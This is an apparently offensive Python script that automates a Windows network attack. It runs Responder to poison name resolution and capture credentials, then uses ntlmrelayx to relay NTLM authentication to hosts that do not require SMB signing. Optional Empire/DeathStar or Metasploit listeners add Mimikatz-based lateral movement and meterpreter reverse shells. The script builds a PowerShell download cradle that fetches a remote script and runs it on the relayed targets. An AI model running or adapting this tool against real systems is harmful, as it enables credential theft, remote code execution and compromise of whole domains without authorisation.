#!/usr/bin/env python3

import argparse
import logging
import os
import time
import requests
import subprocess
import fileinput
import libtmux

def main():
    
    #------------------------------------------------------------------------------
    # Configure Argparse to handle command line arguments
    #------------------------------------------------------------------------------
    desc = "Responder / NTLMRelayX automation script with optional Empire / DeathStar listeners"
    
    parser = argparse.ArgumentParser(description=desc)
    
    parser.add_argument('-d','--debug',
                        help='Print lots of debugging statements',
                        action="store_const",dest="loglevel",const=logging.DEBUG,
                        default=logging.WARNING
    )
    parser.add_argument('-v','--verbose',
                        help='Be verbose',
                        action="store_const",dest="loglevel",const=logging.INFO
    )
    parser.add_argument('host_ip', help='Host IP',
                        nargs='?', default = ''
    )
    parser.add_argument('target_ip', help='Target IP / Range / Subnet (nmap format)',
                        nargs='?', default = ''
    )
    parser.add_argument('--port', '-p', help='Port for Empire listener / MSF web handler (443)',
                        default='443'
    )
    
    parser_command=parser.add_mutually_exclusive_group(required=True)
    
    parser_command.add_argument('--capture', help='Capture credentials only - no relay',
                        action='store_const', dest='action', const='capture', default='capture'
    )
    parser_command.add_argument('--empire', help='Start Empire listener as relay target',
                        action='store_const', dest='action', const='empire'
    )
    parser_command.add_argument('--msf', help='Start Metasploit listener as relay target',
                        action='store_const', dest='action', const='msf'
    )
    parser_command.add_argument('--deathstar', help='Start Empire listener as relay target with Deathstar autopwn',
                        action='store_const', dest='action', const='deathstar'
    )
    parser_command.add_argument('--command', help='Command to relay to targets',
                        dest='action'
    )
    
    parser.add_argument('--no-mimikatz', help='Deathstar - Do not use Mimikatz during lateral movement (default: False)',
                        action='store_true', dest='disable_mimikatz'
    )
    parser.add_argument('--no-domain-privesc', help='Deathstar - Do not use domain privilege escalation techniques (default: False)',
                        action='store_true', dest='disable_domain_privesc'
    )

    args = parser.parse_args()
    
    host_ip = args.host_ip
    target_ip = args.target_ip
    empire_lport = args.port
    msf_srvport = args.port
    msf_lport = '8443'
    action=args.action
    disable_mimikatz = args.disable_mimikatz
    disable_domain_privesc = args.disable_domain_privesc
    
    if action=='capture':
        launch_relayx=False
        launch_empire=False
        launch_deathstar=False
        launch_msf=False
    elif action=='empire':
        launch_relayx=True
        launch_empire=True
        launch_deathstar=False
        launch_msf=False
    elif action=='deathstar':
        launch_relayx=True
        launch_empire=True
        launch_deathstar=True
        launch_msf=False
    elif action=='msf':
        launch_relayx=True
        launch_empire=False
        launch_deathstar=False
        launch_msf=True
    else:
        launch_relayx=True
        launch_empire=False
        launch_deathstar=False
        launch_msf=False
        relayx_command=action
    
    if not host_ip:
        host_ip = input("\nEnter interface IP address to listen on: ")
    if not target_ip and not action=='capture':
        target_ip = input("\nEnter relay target IP / Range / Subnet (nmap format): ")
    
    empire_user = os.environ['EMPIRE_USER']
    empire_pass = os.environ['EMPIRE_PASS']
    
    # Set up tmux window
    tmux_server = libtmux.Server()
    tmux_session = tmux_server.new_session(session_name="mitm", window_name="mitm", kill_session=True)
    tmux_window =  tmux_session.select_window("mitm")
    tmux_pane = tmux_window.attached_pane
    
    if launch_relayx:
        print("Getting relay target list")
        subprocess.Popen("/opt/check-smb-signing.sh --finger --finger-path /opt/Responder/tools/RunFinger.py --out-dir /tmp -a %s" % (target_ip), shell=True).wait()
    
    if launch_empire:
        print("\nLaunching Empire (waiting 10s)...")
        command = 'cd /opt/Empire && ./empire --rest --username %s --password %s' % (empire_user, empire_pass)
        tmux_pane.send_keys(command)
        time.sleep(10)
        
        if launch_deathstar:
            print("\nLaunching DeathStar (waiting 10s)...")
        else:
            print("\nLaunching DeathStar to create Empire listener (waiting 10s)...")
        
        command = 'cd /opt/DeathStar && python3 ./DeathStar.py -u %s -p %s -lip %s -lp %s' % (empire_user, empire_pass, host_ip, empire_lport)
        if disable_mimikatz:
            command += " --no-mimikatz"
        if disable_domain_privesc:
            command+= " --no-domain-privesc"
        
        tmux_pane = tmux_pane.split_window()
        tmux_pane.send_keys(command)
        time.sleep(10)
    
        #Even if we do not use DeathStar, we still use it to spawn the listener; leave the window open in case we want to fire it up again later
        if not launch_deathstar:
            print("Killing DeathStar (you can relaunch it later if you want)...")
            tmux_pane.send_keys('C-c', enter=False, suppress_history=False)
        
        print("\nGetting API Token...")
        requests.packages.urllib3.disable_warnings()        #Disable untrusted SSL cert warning
        json = requests.post('https://localhost:1337/api/admin/login', verify=False, json={"username":empire_user, "password":empire_pass}).json()
        empire_token = json['token']
        print("Token: " + empire_token)
        
        print("\nGetting powershell stager...")
        json = requests.post('https://localhost:1337/api/stagers?token=' + empire_token, verify=False, json={"StagerName":"multi/launcher", "Listener":"DeathStar"}).json()
        empire_stager = json['multi/launcher']['Output']
        print("Stager: " + empire_stager)
        
        relayx_command = empire_stager
        
    if launch_msf:
        command = 'msfconsole -q -x "use exploit/multi/script/web_delivery; set target 2; set uripath /; set ssl true; set srvport %s; set payload windows/meterpreter/reverse_https; set exitonsession false; set lhost %s; set lport %s; set enablestageencoding true; set autorunscript migrate -f; exploit -j -z"' % (msf_srvport, host_ip, msf_lport)
        
        tmux_pane = tmux_pane.split_window()
        tmux_pane.send_keys(command)
        time.sleep(10)
        
        relayx_command = 'powershell -nop -exec bypass -c "IEX((New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/jaredhaight/Invoke-MetasploitPayload/master/Invoke-MetasploitPayload.ps1\'); Invoke-MetasploitPayload \'https://%s:%s/\'"' % (host_ip, msf_srvport)
        
        
    if launch_relayx:
        for line in fileinput.input("/opt/Responder/Responder.conf", inplace=True):
            line=line.replace("SMB = On","SMB = Off")
            line=line.replace("HTTP = On","HTTP = Off")
            line=line.replace("HTTPS = On","HTTPS = Off")
            print(line)
        fileinput.close()
        
        if os.path.exists("/tmp/hosts-signing-false"):
            command = "ntlmrelayx.py -smb2support -socks -tf %s -c '%s'" % ("/tmp/hosts-signing-false.txt", relayx_command)
        else:
            command = "ntlmrelayx.py -smb2support -c '%s'" % (relayx_command)
            
        #tmux_window.split_window(shell=command)
        tmux_pane = tmux_pane.split_window()
        tmux_pane.send_keys(command)
    
    command = "cd /opt/Responder && python ./Responder.py -I eth0 -r -d -w -e " + host_ip
    #tmux_window.split_window(shell=command)
    tmux_pane = tmux_pane.split_window()
    tmux_pane.send_keys(command)
    
    tmux_window.select_layout("main-vertical")
    tmux_server.attach_session(target_session="mitm")
    
    
    
if __name__ == '__main__':
    main()